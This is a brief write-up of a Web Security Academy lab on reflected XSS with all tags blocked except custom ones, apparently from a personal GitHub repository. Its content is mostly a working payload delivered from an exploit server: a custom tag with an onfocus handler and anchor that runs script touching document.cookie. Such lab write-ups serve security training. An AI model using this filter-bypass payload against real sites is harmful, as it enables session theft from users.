# Lab: Reflected XSS into HTML context with all tags blocked except custom ones #

## Lab Description ##

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/ef5658c6-c97a-4b13-b2f5-fab27804d9c4)

> We  goto exploit server and deliever the payload
```
  <script>
location = 'https://0a5e000304325f6f80cafd4d00f80059.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/e70bcf17-21ca-470a-b796-3352a45b89e3)

![image](https://github.com/anandurdas11/Web_Securityy/assets/83402050/ef309a63-0312-41b9-a26f-fb14e292efba)
